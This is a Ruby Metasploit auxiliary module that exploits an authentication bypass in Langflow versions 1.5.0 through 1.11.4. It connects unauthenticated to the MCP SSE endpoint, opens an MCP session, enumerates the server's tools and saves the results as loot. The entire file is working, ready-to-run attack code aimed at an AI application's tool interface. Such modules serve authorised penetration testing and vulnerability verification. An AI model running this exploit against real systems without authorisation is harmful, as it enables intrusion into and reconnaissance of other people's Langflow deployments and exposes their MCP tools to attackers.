##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Langflow AI Authentication Bypass',
        'Description' => %q{
          Langflow versions 1.5.0 through 1.11.4 allow unauthenticated
          connections to the MCP SSE endpoint, allowing attackers to initialize
          MCP sessions and retrieve privileged MCP-related information.

          The MCP information collected from this module is stored in Metasploit
          loot as a JSON document.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Richard Howe'
        ],
        'References' => [
          ['CVE', '2026-93680']
        ],
        'DisclosureDate' => '2026-09-22',
        'DefaultOptions' => { 'RPORT' => 7860 },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new(
          'TARGETURI',
          [
            true,
            'The base path to the Langflow installation',
            '/'
          ]
        ),
        OptInt.new(
          'SSETimeout',
          [
            true,
            'Maximum number of seconds to wait for the MCP SSE response',
            15
          ]
        )
      ]
    )
  end

  def connect_sse
    print_status('Connecting to Langflow MCP SSE endpoint...')

    @sse_client = Rex::Proto::Http::Client.new(
      rhost,
      rport,
      {
        'Msf' => framework,
        'MsfExploit' => self
      },
      ssl,
      ssl_version,
      proxies
    )

    @sse_client.connect

    request = @sse_client.request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'mcp', 'sse'),
      'headers' => {
        'Accept' => 'text/event-stream',
        'Cache-Control' => 'no-cache',
        'Connection' => 'keep-alive'
      }
    )

    @sse_client.send_request(request, 10)

    response = read_sse_http_response

    unless response.start_with?('HTTP/')
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Invalid HTTP response received from MCP SSE endpoint')
    end

    status_line = response.lines.first.to_s

    unless status_line.match?(%r{\AHTTP/\S+\s+200\b})
      fail_with(Msf::Module::Failure::UnexpectedReply, "MCP SSE endpoint returned #{status_line.strip}")
    end

    print_good('Connected to MCP SSE endpoint')

    parse_sse_endpoint(response)
  end

  def read_sse_http_response
    response = +''
    deadline = Time.now + datastore['SSETimeout']

    until response.include?("\r\n\r\n")
      remaining = deadline - Time.now

      if remaining <= 0
        raise ::Timeout::Error, 'Timed out waiting for SSE HTTP headers'
      end

      chunk = @sse_client.conn.timed_read(
        4096,
        remaining
      )

      if chunk.nil? || chunk.empty?
        raise ::EOFError, 'SSE connection closed while reading HTTP headers'
      end

      response << chunk
    end

    response
  end

  def parse_sse_endpoint(initial_data)
    data = initial_data.dup

    return if extract_session_id(data)

    deadline = Time.now + datastore['SSETimeout']

    until @session_id
      remaining = deadline - Time.now

      if remaining <= 0
        raise ::Timeout::Error, 'Timed out waiting for MCP session ID'
      end

      chunk = @sse_client.conn.timed_read(
        4096,
        remaining
      )

      if chunk.nil?
        raise ::EOFError, 'SSE connection closed while waiting for MCP session ID'
      end

      next if chunk.empty?

      data << chunk
      extract_session_id(data)
    end
  end

  def extract_session_id(data)
    match = data.match(
      %r{(?:/api/v1/mcp/\?session_id=|session_id=)([A-Za-z0-9._~-]+)}
    )

    return false unless match

    @session_id = match[1]

    print_good("MCP session ID: #{@session_id}")

    true
  end

  def initialize_mcp_session
    print_status('Initializing MCP session...')

    initialize_data = {
      'jsonrpc' => '2.0',
      'id' => 1,
      'method' => 'initialize',
      'params' => {
        'protocolVersion' => '2025-06-18',
        'capabilities' => {},
        'clientInfo' => {
          'name' => 'metasploit',
          'version' => '1.0.0'
        }
      }
    }

    res = send_mcp_request(initialize_data)

    fail_with(Msf::Module::Failure::Unreachable, 'No response received from MCP initialize request') unless res
    fail_with(Msf::Module::Failure::UnexpectedReply, "MCP initialize returned HTTP #{res.code}") unless res.code == 202

    print_good("MCP initialize accepted (HTTP #{res.code})")

    @initialize_response = read_mcp_response(1)

    display_initialize_info

    send_initialized_notification
  end

  def send_initialized_notification
    print_status('Sending MCP initialized notification...')

    initialized_data = {
      'jsonrpc' => '2.0',
      'method' => 'notifications/initialized'
    }

    res = send_mcp_request(initialized_data)

    fail_with(Msf::Module::Failure::Unreachable, 'No response received from initialized notification') unless res
    fail_with(Msf::Module::Failure::UnexpectedReply, "Initialized notification returned HTTP #{res.code}") unless res.code == 202

    print_good("MCP initialized notification accepted (HTTP #{res.code})")
  end

  def list_mcp_tools
    print_status('Requesting MCP tool list...')

    tools_data = {
      'jsonrpc' => '2.0',
      'id' => 2,
      'method' => 'tools/list',
      'params' => {}
    }

    res = send_mcp_request(tools_data)

    fail_with(Msf::Module::Failure::Unreachable, 'No response received from tools/list request') unless res
    fail_with(Msf::Module::Failure::UnexpectedReply, "tools/list returned HTTP #{res.code}") unless res.code == 202

    print_good("MCP tools/list accepted (HTTP #{res.code})")

    @tools_response = read_mcp_response(2)

    display_tools_info
  end

  def send_mcp_request(data)
    uri = normalize_uri(
      target_uri.path,
      'api',
      'v1',
      'mcp',
      ''
    ) + "?session_id=#{Rex::Text.uri_encode(@session_id)}"

    send_request_cgi(
      'method' => 'POST',
      'uri' => uri,
      'ctype' => 'application/json',
      'data' => JSON.generate(data),
      'headers' => {
        'Accept' => 'application/json, text/event-stream',
        'Content-Type' => 'application/json'
      },
      'timeout' => 10
    )
  end

  def read_mcp_response(request_id)
    buffer = +''
    deadline = Time.now + datastore['SSETimeout']

    loop do
      remaining = deadline - Time.now

      break if remaining <= 0

      begin
        chunk = @sse_client.conn.timed_read(
          4096,
          remaining
        )
      rescue ::Timeout::Error
        break
      end

      break if chunk.nil?
      next if chunk.empty?

      buffer << chunk

      response = extract_mcp_response(buffer, request_id)
      return response if response
    end

    fail_with(Msf::Module::Failure::UnexpectedReply, "Timed out waiting for MCP response with ID #{request_id}")
  end

  def extract_mcp_response(data, request_id)
    data.lines.each do |line|
      next unless line.start_with?('data:')

      payload = line.sub(/^data:\s*/, '').strip

      begin
        parsed = JSON.parse(payload)
        next unless parsed.is_a?(Hash)
        next unless parsed['id'] == request_id

        return parsed
      rescue JSON::ParserError
        next
      end
    end

    nil
  end

  def display_initialize_info
    result = @initialize_response['result']

    fail_with(Msf::Module::Failure::UnexpectedReply, 'MCP initialize response did not contain a result') unless result.is_a?(Hash)

    protocol_version = result['protocolVersion']
    server_info = result['serverInfo'] || {}
    capabilities = result['capabilities'] || {}

    print_good("MCP server: #{server_info['name']} #{server_info['version']}")
    print_good("MCP protocol version: #{protocol_version}")

    print_status("MCP capabilities: #{capabilities.keys.join(', ')}") unless capabilities.empty?
  end

  def display_tools_info
    result = @tools_response['result']

    fail_with(Msf::Module::Failure::UnexpectedReply, 'MCP tools/list response did not contain a result') unless result.is_a?(Hash)

    tools = result['tools']

    fail_with(Msf::Module::Failure::UnexpectedReply, 'MCP tools/list response did not contain tools') unless tools.is_a?(Array)

    print_good("MCP tools discovered: #{tools.length}")

    tools.each do |tool|
      next unless tool.is_a?(Hash)

      name = tool['name']
      description = tool['description']

      if description
        print_status("Tool: #{name} - #{description}")
      else
        print_status("Tool: #{name}")
      end
    end
  end

  def store_mcp_loot
    initialize_result = @initialize_response['result'] || {}
    server_info = initialize_result['serverInfo'] || {}
    capabilities = initialize_result['capabilities'] || {}
    tools_result = @tools_response['result'] || {}

    loot = {
      'target' => {
        'host' => rhost,
        'port' => rport,
        'ssl' => ssl,
        'target_uri' => target_uri.path
      },
      'mcp' => {
        'protocol_version' => initialize_result['protocolVersion'],
        'server' => {
          'name' => server_info['name'],
          'version' => server_info['version']
        },
        'capabilities' => capabilities,
        'tools' => tools_result['tools'] || []
      }
    }

    loot_data = JSON.pretty_generate(loot)

    path = store_loot(
      'langflow.mcp',
      'application/json',
      rhost,
      loot_data,
      'mcp_info.json',
      'Langflow MCP information'
    )

    print_good("Langflow MCP information stored in loot: #{path}")
  end

  def run
    @sse_client = nil
    @session_id = nil
    @initialize_response = nil
    @tools_response = nil

    begin
      connect_sse
      initialize_mcp_session
      list_mcp_tools
      store_mcp_loot
    rescue Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable,
           Rex::ConnectionTimeout, ::Timeout::Error, ::EOFError => e
      fail_with(Msf::Module::Failure::Unreachable, "MCP communication failed: #{e.message}")
    rescue StandardError => e
      fail_with(Msf::Module::Failure::UnexpectedReply, "MCP information gathering failed: #{e.message}")
    ensure
      @sse_client&.close
    end
  end
end
